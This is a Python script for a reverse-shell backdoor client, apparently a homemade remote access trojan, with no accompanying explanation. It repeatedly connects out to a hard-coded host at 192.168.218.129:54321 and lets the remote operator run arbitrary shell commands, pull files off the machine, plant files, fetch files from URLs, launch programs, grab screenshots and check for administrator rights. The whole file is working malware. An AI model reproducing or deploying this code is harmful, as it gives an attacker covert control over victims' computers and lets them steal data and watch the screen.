#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import threading
from mss import mss

sock = None
admin = ""

# ---------- Utility functions ----------

def reliable_send(data):
    """Send JSON data with newline delimiter"""
    try:
        msg = json.dumps(data) + "\n"
        sock.sendall(msg.encode("utf-8"))
    except Exception as e:
        pass

def reliable_recv():
    """Receive JSON data framed by newline"""
    buf = b""
    while b"\n" not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            raise Exception("Socket closed")
        buf += chunk
    line, _, remainder = buf.partition(b"\n")
    return json.loads(line.decode("utf-8"))

def is_admin():
    global admin
    try:
        os.listdir(os.sep.join([os.environ.get("SystemRoot", "C:\\windows"), "temp"]))
        admin = "[+] Administrator Privilege!"
    except:
        admin = "[!!] User Privilege!"

def screenshot():
    with mss() as sct:
        sct.shot()

def download(url):
    r = requests.get(url)
    fname = url.split("/")[-1]
    with open(fname, "wb") as f:
        f.write(r.content)

# ---------- Shell loop ----------

def shell():
    global sock
    while True:
        try:
            command = reliable_recv()

            if command == "q":
                break

            elif command.startswith("help"):
                help_text = """download <path>   -> Download file
upload <path>     -> Upload file
get <url>         -> Download from URL
start <path>      -> Start program
screenshot        -> Take screenshot
check             -> Check admin privileges
q                 -> Quit"""
                reliable_send(help_text)

            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    reliable_send("[+] Changed directory to " + os.getcwd())
                except Exception as e:
                    reliable_send("[!!] Failed: " + str(e))

            elif command.startswith("download "):
                try:
                    path = command[9:].strip()
                    with open(path, "rb") as f:
                        data = base64.b64encode(f.read()).decode("ascii")
                        reliable_send(data)
                except Exception as e:
                    reliable_send("[!!] Download failed: " + str(e))

            elif command.startswith("upload "):
                try:
                    path = command[7:].strip()
                    data = reliable_recv()
                    with open(path, "wb") as f:
                        f.write(base64.b64decode(data.encode("ascii")))
                    reliable_send("[+] File uploaded to " + path)
                except Exception as e:
                    reliable_send("[!!] Upload failed: " + str(e))

            elif command.startswith("get "):
                try:
                    download(command[4:].strip())
                    reliable_send("[+] File downloaded")
                except Exception as e:
                    reliable_send("[!!] Failed: " + str(e))

            elif command.startswith("start "):
                try:
                    subprocess.Popen(command[6:].strip(), shell=True)
                    reliable_send("[+] Started")
                except Exception as e:
                    reliable_send("[!!] Failed: " + str(e))

            elif command.startswith("screenshot"):
                try:
                    screenshot()
                    with open("monitor-1.png", "rb") as sc:
                        img = base64.b64encode(sc.read()).decode("ascii")
                        reliable_send(img)
                    os.remove("monitor-1.png")
                except Exception as e:
                    reliable_send("[!!] Screenshot failed: " + str(e))

            elif command.startswith("check"):
                is_admin()
                reliable_send(admin)

            else:
                try:
                    proc = subprocess.Popen(command, shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    result = proc.stdout.read() + proc.stderr.read()
                    reliable_send(result.decode("utf-8", errors="ignore"))
                except Exception as e:
                    reliable_send("[!!] Execution failed: " + str(e))

        except Exception as e:
            reliable_send("[!!] Error: " + str(e))
            break

# ---------- Connection loop ----------

def connection():
    global sock
    while True:
        time.sleep(5)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("192.168.218.129", 54321))  # <-- updated IP
            shell()
        except Exception as e:
            try:
                sock.close()
            except:
                pass

# ---------- Entry ----------

if __name__ == "__main__":
    connection()
